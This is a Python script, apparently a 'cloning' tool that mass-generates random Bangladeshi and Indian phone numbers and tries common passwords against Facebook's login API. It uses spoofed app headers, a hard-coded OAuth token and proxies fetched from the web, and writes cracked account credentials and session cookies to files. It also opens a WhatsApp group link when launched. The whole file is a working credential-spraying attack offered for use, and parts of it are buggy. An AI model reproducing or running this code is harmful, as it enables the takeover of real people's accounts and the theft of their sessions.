##---------------IMPORT---------------##
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
import os,requests,json,time,re,random,sys,uuid,string,subprocess
from string import *
import bs4
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as bxx
try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(prox)
except Exception as e:
	print('')
proxies=open('proxies.txt','r').read().splitlines()
oks=[]
cps=[]
loop=0
##------------(COLOUR)-------------##   
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
T = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
##------------(LINE)-------------##  
def linex():
        print(f'{R}--------------------------------------------------')
def clear():
        os.system(f'clear')
        print(logo)
##------------(LOGO)------------##
os.system("xdg-open https://chat.whatsapp.com/BfwFjK6Lhv53djYPlhMMK7")
logo=(f"""{A}
      {A}888b     d888 8888888b.  888b     d888 
      {G}8888b   d8888 888   Y88b 8888b   d8888 
      {A}88888b.d88888 888    888 88888b.d88888 
      {G}888Y88888P888 888   d88P 888Y88888P888 
      {G}888 Y888P 888 8888888P"  888 Y888P 888 
      {A}888  Y8P  888 888 T88b   888  Y8P  888 
      {G}888   "   888 888  T88b  888   "   888 
      {A}888       888 888   T88b 888       888
{R}--------------------------------------------------
{R}❲{G}~{R}❳{G} DEVELOPER {R}:{G} Roman Hasan
{R}❲{G}~{R}❳{G} VERSION   {R}:{G} Trial
{R}--------------------------------------------------""")
##--------------MAIN--------------##
def Main_MRM():
        clear()
        print(f"{R}❲{G}1{R}❳{G} Start File Cloning")
        print(f"{R}❲{G}2{R}❳{G} Start Random Cloning")
        print(f"{R}❲{G}0{R}❳{G} Exit Tools")
        linex()
        opt1 = input(f"{R}❲{G}?{R}❳{G} Selection {R}:{G} ")
        if opt1 == "1": file()   
        elif opt1 == "2": bd()
        elif opt1 == "0":linex();print(f'{R}❲{G}~{R}❳{G} Exit Done Brother ');exit()
        else:linex();print(f'{R}❲{G}~{R}❳{G} Selected Wrong Option ');time.sleep(2);Main_MRM()
##--------------BD-------------##
def bd():
    user=[]
    clear()
    print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} 017 {R}|{G} 019 {R}|{G} 018 {R}|{G} 016');linex()
    code=input(f"{R}❲{G}?{R}❳{G} Selection {R}:{G} ")
    clear()
    print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} 3000 {R}|{G} 5000 {R}|{G} 10000 {R}|{G} 9999');linex()
    try:
        limit=int(input(f'{R}❲{G}?{R}❳{G} Selection {R}:{G} '))
    except ValueError:
        limit=50000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as MRM:
        tl=str(len(user))
        print(f'             {R}❲{G}Bd Random Uid Cloning{R}❳{G}');linex()
        print(f'{R}❲{G}~{R}❳{G} Total Id {R}:{A}',tl)
        print(f'{R}❲{G}~{R}❳{G} Sim Code {R}:{A}',code)
        print(f'{R}❲{G}~{R}❳{G} If No Result {R}❲{A}On{R}/{A}Off{R}❳{G} Airplane Mode ');linex()
        for psx in user:
            ids=code+psx
            passlist=[psx[2:],psx,code+psx,code+psx[:3],'mehedi','mababa','taniya','sumaiya','saiful','jannatul','Fatema','farjana','sabbir','humaira','alamin','mimmim','aaabbb','hridoy','fariya','shakil','roksana','mafiya','habiba','free fire','shahin','i love you','sadiya','ayesha','nusrat','Bangla','morshed','gaming','tamanna','jannat','laboni','708090','121234','77889900','999888','113355','112255','102030','405060','112200','506070','113355']
            MRM.submit(method_crack,ids,passlist)
    print(f'\r{R}--------------------------------------------------')
    print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
    #print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
    #print(f'{R}❲{G}~{R}❳{G} TOTAL CP ID {R}:{Y} '+str(len(cps)))
    input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
    Main_MRM()

##--------------INDIA_RANDOM------------##

def ind():
                user=[]
                clear()
                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} +91639 {R}|{G} +91620 {R}|{G} +91720 {R}|{G} +91789');linex()
                code = input(f"{R}❲{G}?{R}❳{G} Selection {R}:{G} ")
                try:                    
                        clear();print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} 3000 {R}|{G} 5000 {R}|{G} 10000 {R}|{G} 9999');linex()
                        limit = int(input(f'{R}❲{G}?{R}❳{G} Selection {R}:{G} '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as MRM:     
                        clear()
                        tl = str(len(user))
                        print(f'            {R}❲{G}India Random Uid Cloning{R}❳{G}');linex()
                        print(f'{R}❲{G}~{R}❳{G} Total Id {R}:{A}',tl)
                        print(f'{R}❲{G}~{R}❳{G} Sim Code {R}:{A}',code)
                        print(f'{R}❲{G}~{R}❳{G} If No Result {R}❲{A}On{R}/{A}Off{R}❳{G} Airplane Mode ');linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx[2:],psx,code+psx,code+psx[:3],'57273200','59039200','57575751']
                                MRM.submit(rd1,ids,passlist)
                print(f'\r{R}--------------------------------------------------')
                print(f"{R}❲{G}~{R}❳{G} Cloning Hasbeen Completed ")
                print(f'{R}❲{G}~{R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
                print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/MRM_M1_FILE_OK.txt")
                print(f'\r{R}--------------------------------------------------')
                input(f"{R}❲{G}~{R}❳{G} Press Enter To Go Back ")
                os.system('python Main_MRM.py')
 
##------------UA--------------##
def Mrm():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/419.0.0.67.59;FBBV/692042011;FBRV/0;FBPN/com.facebook.katana;FBLC/bn_IN;FBMF/iPhone 6s Plus;FBBD/iPhone 6s Plus;FBDV/iPhone 6s Plus;FBSV/11;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
        return ua

##--------------RANDOM-METHOD------###
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write(f'\r{R}❲{G}MRM-XD{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)))
            sys.stdout.flush()
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            datax={'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'email': ids,
                    'password': pas,
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': 'en_GB',
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent':Mrm(),
                    'Accept-Encoding':  'gzip, deflate',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'X-FB-Friendly-Name': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                ckkx=lock_check(uid)
                if ckkkx =='LOCK':
                    break
                else:
                    print(f'\r{R}❲{G}MRM-OK{R}❳{G} '+str(uid)+f' {R}|{G} '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print(f'\r{R}❲{G}COOKIE{R}❳{A}->{G} '+coki)
                    open('/sdcard/MRM-RANDOM-OK.txt','a').write(str(uid)+' | '+pas+' |------> '+coki+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                #print(f'\r{R}❲{Y}MRM-CP{R}❳{Y} '+ids+f' {R}|{Y} '+pas+'\033[1;37m')
                open('/sdcard/MRM-RANDOM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass

##-----------LOCK-REMOV---------##
def lock_check(uid):
    sessionx=requests.Session()
    urlx=f'https://www.facebook.com/p/{uid}'
    req=bxx(sessionx.get(urlx).content,'html.parser')
    tx=req.find('title').text
    if tx =='Facebook':
        return('LOCK')
    else:
        return('LIVE')

##--------------END---------------##
Main_MRM()